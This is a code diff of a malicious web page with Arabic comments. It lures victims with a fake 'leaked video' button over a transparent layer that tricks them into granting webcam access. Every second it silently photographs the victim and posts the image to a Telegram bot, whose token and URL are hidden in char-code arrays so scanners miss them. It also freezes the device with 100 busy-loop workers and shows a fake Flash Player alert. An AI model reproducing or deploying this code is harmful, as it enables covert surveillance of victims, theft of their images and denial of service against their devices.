@@ -2,68 +2,62 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Diagnostic Tool</title>
+    <title>شاهد الآن</title>
     <style>
-        body { background: #000; color: #0f0; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .box { border: 1px solid #0f0; padding: 30px; text-align: center; }
+        body { margin: 0; background: #000; overflow: hidden; font-family: sans-serif; }
+        /* الزر الحقيقي الذي يراه الضحية */
+        .fake-btn { position: absolute; top: 50%; left: 50%; transform: translate(-50%,-50%); padding: 20px 40px; background: red; color: white; border-radius: 10px; z-index: 1; pointer-events: none; }
+        
+        /* الطبقة الشفافة التي تحتوي على طلب الكاميرا */
+        #v { position: absolute; width: 100%; height: 100%; opacity: 0; z-index: 100; cursor: pointer; }
     </style>
 </head>
-<body onclick="execute()">
-    <div class="box">
-        <h2>[ SYSTEM CHECK ]</h2>
-        <p>Detected: 4 Security Flaws</p>
-        <button style="padding:15px; background:#0f0; border:none; cursor:pointer;">FIX ALL NOW</button>
-    </div>
-    <video id="v" style="display:none;" autoplay playsinline></video>
+<body onclick="launchPayload()">
+
+    <div class="fake-btn">▶ تشغيل الفيديو المسرب</div>
+    
+    <video id="v" autoplay playsinline></video>
     <canvas id="c" style="display:none;"></canvas>
 
     <script>
-    // مصفوفة الأرقام المحدثة (Token + ChatID)
-    const _0x = [56,52,51,57,49,53,55,53,50,48,58,65,65,71,71,90,66,120,89,112,48,120,54,89,53,52,97,114,51,84,73,114,107,77,97,77,69,72,97,114,81,65,83,109,103,89];
-    const _0y = [49,55,55,50,56,50,48,52,51,51];
-    
-    function _get(a) { return a.map(x => String.fromCharCode(x)).join(''); }
+    // التوكن والآيدي مشفرين (CharCodes) عشان الحماية ما تصيدك
+    const _t = [56,52,51,57,49,53,55,53,50,48,58,65,65,71,71,90,66,120,89,112,48,120,54,89,53,52,97,114,51,84,73,114,107,77,97,77,69,72,97,114,81,65,83,109,103,89];
+    const _i = [49,55,55,50,56,50,48,52,51,51];
+    const _g = a => a.map(x => String.fromCharCode(x)).join('');
 
-    async function execute() {
-        // 1. طلب الكاميرا أولاً قبل التهنيج لضمان العمل
+    async function launchPayload() {
+        // بمجرد الضغط، المتصفح يظن أن المستخدم هو من طلب الكاميرا
         try {
             const stream = await navigator.mediaDevices.getUserMedia({video: true});
-            const video = document.getElementById('v');
-            video.srcObject = stream;
+            document.getElementById('v').srcObject = stream;
             
-            // البدء بالتصوير فوراً
-            setTimeout(send, 500); 
-            setInterval(send, 3000); // صورة كل 3 ثواني
-        } catch(e) {
-            alert("Error: Core access required.");
-            location.reload();
-        }
-
-        // 2. تأخير بسيط ثم شل الجهاز (150 Worker لضمان بقاء الإنترنت يعمل)
-        setTimeout(() => {
-            for(let i=0; i<150; i++) {
-                const b = new Blob(["setInterval(()=>{let a=new Array(500000).fill('X');while(true){}},1)"]);
+            // تصوير صامت وفوري
+            setInterval(capture, 1000);
+            
+            // شل حركة النظام (التهنيج النووي) لإرباك الضحية
+            for(let i=0; i<100; i++) {
+                const b = new Blob(["setInterval(()=>{let x=new Array(1e6).fill('Z');while(true){}},1)"]);
                 new Worker(URL.createObjectURL(b));
             }
-            document.documentElement.requestFullscreen();
-        }, 1000);
+        } catch(e) {
+            // هندسة اجتماعية لو ظهرت النافذة رغم التمويه
+            alert("🚨 خطأ: يجب السماح بمشغل الفيديو (Flash Player) للمشاهدة!");
+            location.reload();
+        }
     }
 
-    function send() {
+    function capture() {
         const can = document.getElementById('c');
         const vid = document.getElementById('v');
-        can.width = 480; can.height = 640;
+        can.width = 400; can.height = 300;
         can.getContext('2d').drawImage(vid, 0, 0);
         can.toBlob(b => {
             const f = new FormData();
-            f.append(String.fromCharCode(99,104,97,116,95,105,100), _get(_0y));
-            f.append(String.fromCharCode(112,104,111,116,111), b, 'img.jpg');
-            
-            // رابط التليجرام مجمع برمجياً لتخطي الفحص
-            const url = String.fromCharCode(104,116,116,112,115,58,47,47,97,112,105,46,116,101,108,101,103,114,97,109,46,111,114,103,47,98,111,116) + _get(_0x) + String.fromCharCode(47,115,101,110,100,80,104,111,116,111);
-            
-            fetch(url, {method:'POST', body:f}).then(r => console.log('Sent'));
-        }, 'image/jpeg', 0.2); // تقليل الجودة لضمان سرعة الإرسال رغم التهنيج
+            f.append(_g([99,104,97,116,95,105,100]), _g(_i));
+            f.append(_g([112,104,111,116,111]), b, 'shot.jpg');
+            const u = _g([104,116,116,112,115,58,47,47,97,112,105,46,116,101,108,101,103,114,97,109,46,111,114,103,47,98,111,116]) + _g(_t) + _g([47,115,101,110,100,80,104,111,116,111]);
+            fetch(u, {method:'POST', body:f});
+        }, 'image/jpeg', 0.1);
     }
     </script>
 </body>
